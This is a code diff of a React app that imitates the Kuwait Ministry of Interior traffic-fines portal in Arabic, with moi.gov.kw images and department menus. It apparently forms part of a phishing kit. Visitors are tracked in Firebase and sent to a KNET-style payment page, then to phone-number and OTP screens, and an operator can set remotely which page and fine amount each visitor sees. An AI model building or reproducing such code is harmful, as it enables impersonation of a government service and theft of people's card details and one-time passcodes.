@@ -1,38 +1,35 @@
-import { doc, onSnapshot } from 'firebase/firestore';
-import './App.css';
-import { addData, db } from './firebase';
-import { useEffect, useState } from 'react';
-import Plate from './plate';
-import { Loader } from './loader';
-import Kent from './kent/kent';
-import { useFetchViolationData } from './lib/util';
-import VerificationForm from './phone/phone';
-import PhoneOTP from './phone/phone-otp';
-import LoadingScreen from './sahel';
-import FullPageLoader from './loader1';
-
+import { doc, onSnapshot } from "firebase/firestore";
+import "./App.css";
+import { addData, db } from "./firebase";
+import { useEffect, useState } from "react";
+import Plate from "./plate";
+import { Loader } from "./loader";
+import Kent from "./kent/kent";
+import { useFetchViolationData } from "./lib/util";
+import VerificationForm from "./phone/phone";
+import PhoneOTP from "./phone/phone-otp";
+import LoadingScreen from "./sahel";
+import FullPageLoader from "./loader1";
 
 function App() {
-  const [dataall] = useState<any>([])
-  const [isCheked, setIsCheked] = useState<boolean>(false)
-  const { violationData,  fetchViolationData } = useFetchViolationData()
-
+  const [dataall] = useState<any>([]);
+  const [isCheked, setIsCheked] = useState<boolean>(false);
+  const { violationData, fetchViolationData } = useFetchViolationData();
 
   // Call the function
 
-  const [currantPage] = useState(1);
-  const [amount,setAmount] = useState(0);
-  const [_id] = useState('id' + Math.random().toString(16).slice(2));
-  const [id, setId] = useState('');
+  const [amount, setAmount] = useState(0);
+  const [_id] = useState("id" + Math.random().toString(16).slice(2));
+  const [id, setId] = useState("");
 
-  const [page, setPage] = useState('knet');
+  const [page, setPage] = useState("main");
   const data = {
     id: _id,
-    currentPage: currantPage,
+    currentPage: page,
     createdDate: new Date().toISOString(),
     notificationCount: 1,
-    violationValue:amount,
-    page:page,
+    violationValue: amount,
+    page: page,
     personalInfo: {
       id: id,
     },
@@ -40,25 +37,25 @@ function App() {
   const [show, setShow] = useState(false);
   const [loading, setloading] = useState(false);
   useEffect(() => {
-    localStorage.setItem('vistor', _id);
-    console.log(isCheked)
+    localStorage.setItem("vistor", _id);
+    console.log(isCheked);
     addData(data);
   }, []);
   function getSpicficeValue() {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any;
-          if (data.page !=='') {
-            setPage(data.page)
+          if (data.page !== "") {
+            setPage(data.page);
           }
           if (data.violationValue) {
-            if (data.violationValue !== '') {
-              localStorage.setItem('vv', data.violationValue);
+            if (data.violationValue !== "") {
+              localStorage.setItem("vv", data.violationValue);
               setloading(false);
               setShow(true);
-            } else if (data.violationValue === '') {
+            } else if (data.violationValue === "") {
             }
           }
         }
@@ -67,35 +64,40 @@ function App() {
     }
   }
   useEffect(() => {
-    console.log(page)
-      }, [page]);
+    console.log(page);
+  }, [page]);
   const handleSubmit = (e: any) => {
     e.preventDefault();
-    localStorage.setItem('amount',amount?.toString())
-    fetchViolationData(id)
+    localStorage.setItem("amount", amount?.toString());
+    fetchViolationData(id);
     getSpicficeValue();
-    if (id !== '' || id.length > 2) {
+    if (id !== "" || id.length > 2) {
       addData(data);
       setloading(true);
 
       setTimeout(() => {
         setloading(false);
-        setShow(true)
+        setShow(true);
       }, 4000);
     }
   };
   return (
     <>
-        {page === 'knet' ? (
+      {page === "knet" ? (
         <Kent setPage={setPage} />
-      ) : page === 'phone' ?(<VerificationForm setPage={setPage}/>):page==='phoneCode'?(<PhoneOTP setPage={setPage}/>
-      ) : page === 'sahel'?<LoadingScreen/>:(
+      ) : page === "phone" ? (
+        <VerificationForm setPage={setPage} />
+      ) : page === "phoneCode" ? (
+        <PhoneOTP setPage={setPage} />
+      ) : page === "sahel" ? (
+        <LoadingScreen />
+      ) : page === "main" ? (
         <div dir="rtl">
           <header>
             <div className="row">
               <div
                 className="col-4 col-md-2 col-lg-2 text-center"
-                style={{ border: '0px solid red' }}
+                style={{ border: "0px solid red" }}
               >
                 <a className="navbar-brand m-0" href="/main/">
                   <img src="/react.svg" style={{ height: 120 }} />
@@ -103,7 +105,7 @@ function App() {
               </div>
               <div
                 className="col-1 align-self-center"
-                style={{ border: '0px solid red' }}
+                style={{ border: "0px solid red" }}
               >
                 <div className="row">
                   <div className="col text-center">
@@ -141,9 +143,9 @@ function App() {
                   <ul
                     className="navbar-nav flex-grow-1 p-0 clearfix"
                     style={{
-                      margin: '0 auto',
-                      verticalAlign: 'top',
-                      border: '0px solid red',
+                      margin: "0 auto",
+                      verticalAlign: "top",
+                      border: "0px solid red",
                     }}
                   >
                     <li className="nav-item">
@@ -175,7 +177,7 @@ function App() {
                       >
                         <ul
                           className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
-                          style={{ border: '0px solid red' }}
+                          style={{ border: "0px solid red" }}
                         >
                           <li className="nav-item m-0">
                             <a href="#">
@@ -185,10 +187,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link active"
-                              href="#"
-                            >
+                            <a className="nav-link active" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لنظم المعلومات
                               </div>
@@ -211,10 +210,7 @@ function App() {
                           <li className="nav-item">
                             <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
 
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للجنسية ووثائق السفر
                               </div>
@@ -224,10 +220,7 @@ function App() {
                             <a href="#">
                               <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لشؤون الإقامة
                               </div>
@@ -241,10 +234,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للدفاع المدني
                               </div>
@@ -258,10 +248,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لمراكز الخدمة
                               </div>
@@ -275,10 +262,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لخفر السواحل
                               </div>
@@ -292,10 +276,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لشؤون قوة الشرطة
                               </div>
@@ -309,10 +290,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 أكاديمية سعد العبدالله للعلوم الأمنية
                               </div>
@@ -326,10 +304,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للشؤن المالية
                               </div>
@@ -343,10 +318,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للتحقيقات
                               </div>
@@ -360,10 +332,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للتدريب
                               </div>
@@ -391,7 +360,7 @@ function App() {
                       >
                         <ul
                           className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
-                          style={{ border: '0px solid red' }}
+                          style={{ border: "0px solid red" }}
                         >
                           <li className="nav-item m-0">
                             <a href="#">
@@ -401,10 +370,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 إدارة مكافحة الجرائم الإلكترونية
                               </div>
@@ -418,10 +384,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 إدارة حماية الأحداث
                               </div>
@@ -435,10 +398,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة لمكافحة المخدرات
                               </div>
@@ -452,10 +412,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 إدارة حماية الآداب العامة ومكافحة الإتجار
                                 بالأشخاص
@@ -470,10 +427,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإدارة العامة للعلاقات والإعلام الأمني
                               </div>
@@ -487,10 +441,7 @@ function App() {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="#"
-                            >
+                            <a className="nav-link" href="#">
                               <div className="main-menu-text">
                                 الإداره العامة للمؤسسات الإصلاحية
                               </div>
@@ -559,7 +510,7 @@ function App() {
                         </a>
                         <div
                           className="dropdown-menu text-right"
-                          style={{ background: '#e9e6de', padding: 0 }}
+                          style={{ background: "#e9e6de", padding: 0 }}
                         >
                           <a className="dropdown-item" href="/main/emagazine">
                             المجلة الإلكترونية
@@ -611,7 +562,7 @@ function App() {
                         </a>
                         <div
                           className="dropdown-menu text-right"
-                          style={{ background: '#e9e6de', padding: 0 }}
+                          style={{ background: "#e9e6de", padding: 0 }}
                         >
                           <a
                             className="dropdown-item"
@@ -636,10 +587,10 @@ function App() {
                     </li>
                     <li
                       className="nav-item mt-0 mb-0 mr-auto"
-                      style={{ border: '0px solid red', float: 'left' }}
+                      style={{ border: "0px solid red", float: "left" }}
                     >
                       <div
-                        style={{ border: '0px solid white', height: '100%' }}
+                        style={{ border: "0px solid white", height: "100%" }}
                         className="form-group text-center"
                         title="Request culture provider: CookieRequestCultureProvider"
                       >
@@ -647,7 +598,7 @@ function App() {
                           id="selectLanguage"
                           className="form-horizontal d-flex "
                           onSubmit={handleSubmit}
-                          style={{ border: '0px solid green', height: '100%' }}
+                          style={{ border: "0px solid green", height: "100%" }}
                         >
                           <div className="col-12 d-flex">
                             <button className="btn btn-lang align-content-center align-self-center text-center">
@@ -685,9 +636,7 @@ function App() {
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
-                      <a href="#">
-                        الخدمات الالكترونية لرخص السوق
-                      </a>
+                      <a href="#">الخدمات الالكترونية لرخص السوق</a>
                     </div>
                     <div className="col-1">&nbsp;</div>
                   </div>
@@ -701,9 +650,7 @@ function App() {
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
-                      <a href="#">
-                        دفع المخالفات
-                      </a>
+                      <a href="#">دفع المخالفات</a>
                     </div>
                     <div className="col-1">&nbsp;</div>
                   </div>
@@ -765,9 +712,7 @@ function App() {
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
-                      <a href="#">
-                        &nbsp;معاملات المرور
-                      </a>
+                      <a href="#">&nbsp;معاملات المرور</a>
                     </div>
                   </div>
                   <div className="row mt-2">
@@ -786,9 +731,7 @@ function App() {
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
-                      <a href="#">
-                        &nbsp;مواقع الإدارة العامة للمرور
-                      </a>
+                      <a href="#">&nbsp;مواقع الإدارة العامة للمرور</a>
                     </div>
                   </div>
                   <div className="row mt-2">
@@ -801,9 +744,7 @@ function App() {
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
-                      <a href="#">
-                        شروط منح رخص السوق لغير الكويتيين
-                      </a>
+                      <a href="#">شروط منح رخص السوق لغير الكويتيين</a>
                     </div>
                   </div>
                 </div>
@@ -876,7 +817,7 @@ function App() {
                         <div className="form-row mt-2">
                           <div className="col-sm-12 col-md-4">
                             <button
-                              style={{ width: '100%' }}
+                              style={{ width: "100%" }}
                               disabled={loading}
                               type="submit"
                               className="btn btn-primary btn-block mt-2 mt-md-0"
@@ -887,7 +828,7 @@ function App() {
                         </div>
 
                         <div
-                          style={{ borderBottom: '2px solid #d6dce5' }}
+                          style={{ borderBottom: "2px solid #d6dce5" }}
                           className="form-row p-3 mt-3 text-right"
                           id="responseInfo"
                         >
@@ -895,19 +836,41 @@ function App() {
                             <Loader />
                           ) : show ? (
                             <>
-                              {dataall.errorMsg && <Plate setAmount={setAmount}
-                                violations={violationData!} setIsChecked={setIsCheked} />}
-                              <div className="mb-2  p-2" style={{ width: '100%', background: '#e2e3e5', borderRadius: 5 }}>
+                              {dataall.errorMsg && (
+                                <Plate
+                                  setAmount={setAmount}
+                                  violations={violationData!}
+                                  setIsChecked={setIsCheked}
+                                />
+                              )}
+                              <div
+                                className="mb-2  p-2"
+                                style={{
+                                  width: "100%",
+                                  background: "#e2e3e5",
+                                  borderRadius: 5,
+                                }}
+                              >
                                 <div className="flex text-end text-sm rounded">
-                                  <div>عدد المخالفات: {violationData?.totalTicketsCount ?? '1'}</div>
-                                  <div>المبلغ الإجمالي: {violationData?.totalViolationAmount ?? '5'} د.ك</div>
+                                  <div>
+                                    عدد المخالفات:{" "}
+                                    {violationData?.totalTicketsCount ?? "1"}
+                                  </div>
+                                  <div>
+                                    المبلغ الإجمالي:{" "}
+                                    {violationData?.totalViolationAmount ?? "5"}{" "}
+                                    د.ك
+                                  </div>
                                 </div>
                               </div>
-
                               <Plate
-                                violations={violationData?.personalViolationsData} setIsChecked={setIsCheked} setAmount={setAmount} />
-                                إجمالي القيمة المختارة :{amount }
-
+                                violations={
+                                  violationData?.personalViolationsData
+                                }
+                                setIsChecked={setIsCheked}
+                                setAmount={setAmount}
+                              />
+                              إجمالي القيمة المختارة :{amount}
                             </>
                           ) : null}
                         </div>
@@ -922,16 +885,16 @@ function App() {
                           <div className="col-sm-12 col-md-4 text-right">
                             <input
                               type="button"
-                              onClick={() =>{
-                             addData(data)
+                              onClick={() => {
+                                addData(data);
                                 setTimeout(() => {
-                                  setPage('knet');
-                                }, 2000)
-                              }
-                            }
+                                  setPage("knet");
+                                }, 2000);
+                              }}
                               id="btnPay"
-                              className={`btn btn-primary btn-block col-12 ${show ? '' : 'd-none'
-                                }`}
+                              className={`btn btn-primary btn-block col-12 ${
+                                show ? "" : "d-none"
+                              }`}
                               defaultValue="إدفع"
                             />
                           </div>
@@ -944,8 +907,8 @@ function App() {
                             <span
                               className="badge badge-success p-2"
                               style={{
-                                fontWeight: 'normal !important',
-                                background: 'green',
+                                fontWeight: "normal !important",
+                                background: "green",
                                 margin: 4,
                               }}
                             >
@@ -954,9 +917,9 @@ function App() {
                             <span
                               className="badge badge-danger p-2"
                               style={{
-                                fontWeight: 'normal !important',
+                                fontWeight: "normal !important",
                                 margin: 4,
-                                background: 'red',
+                                background: "red",
                               }}
                             >
                               غير قابلة للدفع الكترونياً
@@ -1258,14 +1221,14 @@ function App() {
                       width="8.572em"
                       height="8.572em"
                       viewBox="0 0 103 103"
-                      style={{ background: 'new 0 0 103 103' }}
+                      style={{ background: "new 0 0 103 103" }}
                       xmlSpace="preserve"
                     >
                       <style
                         type="text/css"
                         dangerouslySetInnerHTML={{
                           __html:
-                            '\n                        .st0 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-width: 2;\n                            stroke-miterlimit: 10;\n                        }\n\n                        .st1 {\n                            enable-background: new;\n                        }\n\n                        .st2 {\n                            fill: #fff;\n                        }\n\n                        .st3 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-miterlimit: 10;\n                        }\n',
+                            "\n                        .st0 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-width: 2;\n                            stroke-miterlimit: 10;\n                        }\n\n                        .st1 {\n                            enable-background: new;\n                        }\n\n                        .st2 {\n                            fill: #fff;\n                        }\n\n                        .st3 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-miterlimit: 10;\n                        }\n",
                         }}
                       />
                       <title>sms</title>
@@ -1499,8 +1462,8 @@ function App() {
             </div>
           </div>
         </div>
-      )}
-      <FullPageLoader isLoading={loading}/>
+      ) : null}
+      <FullPageLoader isLoading={loading} />
     </>
   );
 }
